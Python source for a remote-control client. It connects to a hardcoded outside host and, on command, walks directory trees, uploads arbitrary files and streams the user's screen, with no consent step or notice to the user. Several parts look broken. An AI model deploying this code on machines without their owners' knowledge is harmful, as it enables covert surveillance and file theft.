import socket
import json
import threading
import os
import sys
from typing import Dict, Any, Optional
import base64
import cv2
import numpy as np
import time
from PIL import ImageGrab

import signal

class Client:
    def __init__(self, host: str, port: int) -> None:
        self.remote_control_list = []
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.id: Optional[str] = None
        threading.Thread(target=self.receive_message, daemon=True).start()
        self.init_control()
        signal.signal(signal.SIGINT, self.handle_exit)
        signal.signal(signal.SIGTERM, self.handle_exit)
        while True:
            pass

    def __del__(self) -> None:
        self.close()

    def handle_exit(self, signum, frame):
        self.send_message({"mode": "close"})
        self.close()

    def init_control(self) -> None:
        init_message = {"mode": "init", "client_mode": "controlled"}
        self.send_message(init_message)

    def send_message(self, message: Dict[str, Any]) -> None:
        self.socket.send(json.dumps(message).encode('utf-8'))

    def receive_message(self) -> None:
        buffer = ""
        while True:
            data = self.socket.recv(1048576).decode('utf-8')
            buffer += data
            while True:
                try:
                    msg, idx = json.JSONDecoder().raw_decode(buffer)
                    self.handle_message(msg)
                    buffer = buffer[idx:].lstrip()
                except ValueError:
                    break

    def directory(self, data: Dict[str, Any]) -> None:
        root_path = data["param"]["root"]
        file_list = []
        for root, _, files in os.walk(root_path):
            for file in files:
                file_list.append(os.path.join(root, file))
        response = {
            "mode": "return",
            "controll_client_id": data["param"]["controll_client_id"],
            "data": {
                "mode": "dir",
                "list": file_list,
                "client_id": self.id,
                "root": root_path
            }
        }
        self.send_message(response)

    def download(self, file_path: str, controll_client_id: str, output: str) -> None:
        with open(file_path, "rb") as f:
            while True:
                chunk = f.read(1048576)
                if not chunk:
                    break
                chunk_data = chunk.hex()
                response = {
                    "mode": "return",
                    "controll_client_id": controll_client_id,
                    "data": {
                        "mode": "download",
                        "data": chunk_data,
                        "file": file_path,
                        "output": output,
                        "chunk": True
                    }
                }
                self.send_message(response)
        response = {
            "mode": "return",
            "controll_client_id": controll_client_id,
            "data": {
                "mode": "download",
                "data": "",
                "file": file_path,
                "output": output,
                "chunk": False
            }
        }
        self.send_message(response)

    def init_downlaod(self, data):
        file_path = data["param"]["file"]
        controll_client_id = data["param"]["controll_client_id"]
        output = data["param"].get("output", "")

        self.download(file_path, controll_client_id, output)

    def remote_control(self, data):
        fps = data["data"].get("fps", 25)
        definition = data["data"].get("definition", 720)
        quality = data["data"].get("quality", 70)

        resolutions = {
            360: (640, 360),
            480: (854, 480),
            720: (1280, 720),
            1080: (1920, 1080),
            "2k": (2560, 1440),
            "4k": (3840, 2160)
        }
        target_size = resolutions.get(definition, (1280, 720))

        while True:
            start_time = time.time()
            img = ImageGrab.grab()
            img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)

            original_height, original_width = img.shape[:2]
            original_ratio = original_width / original_height

            target_ratio = 16 / 9

            if original_ratio > target_ratio:
                new_width = original_width
                new_height = int(new_width / target_ratio)
                delta_height = new_height - original_height
                top, bottom = delta_height // 2, delta_height - (delta_height // 2)
                img = cv2.copyMakeBorder(img, top, bottom, 0, 0, cv2.BORDER_CONSTANT, value=[0, 0, 0])
            elif original_ratio < target_ratio:
                new_height = original_height
                new_width = int(new_height * target_ratio)
                delta_width = new_width - original_width
                left, right = delta_width // 2, delta_width - (delta_width // 2)
                img = cv2.copyMakeBorder(img, 0, 0, left, right, cv2.BORDER_CONSTANT, value=[0, 0, 0])

            img = cv2.resize(img, target_size)

            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
            _, buffer = cv2.imencode('.jpg', img, encode_param)

            jpg_as_text = base64.b64encode(buffer).decode('utf-8')

            response = {
                "mode": "return",
                "controll_client_id": data["controll_client_id"],
                "remote_control_id": data["remote_control_id"],
                "data": {
                    "params": data["data"],
                    "mode": "remote_control",
                    "img": jpg_as_text,
                    "timestamp": time.time(),
                    "quality": quality,
                    "resolution": f"{target_size[0]}x{target_size[1]}"
                }
            }
            self.send_message(response)

            process_time = time.time() - start_time
            sleep_time = max(0, (1 / fps) - process_time)
            time.sleep(sleep_time)

    def init_remote_control(self, data):

        remote_control_threading = threading.Thread(target=self.remote_control, args=(data,), daemon=True).start()
        self.remote_control_list.append({"id": data["remote_control_id"], "remote_control_threading": remote_control_threading})

    def get_remote_control(self, id):
        for r in self.remote_control_list:
            if r["remote_control_id"] == id:
                return r

    def stop_remote_control(self, data):
        print(data)
        remote_control_info = self.get_remote_control(data["remote_control_id"])
        remote_control_info["remote_control_threading"].stop()
        del remote_control_info

    def handle_message(self, data: Dict[str, Any]) -> None:
        if data["mode"] == "init":
            self.id = data["id"]
        elif data["mode"] == "directory":
            self.directory(data)
        elif data["mode"] == "init_download":
            self.init_downlaod(data)
        elif data["mode"] == "init_remote_control":
            self.init_remote_control(data)
        elif data["mode"] == "stop_remote_control":
            self.stop_remote_control(data)

    def close(self) -> None:
        self.socket.close()
        self.send_message({"mode": "close"})
        sys.exit()


if __name__ == "__main__":
    client = Client('us-sjc-bgp-1.ofalias.org', 60813)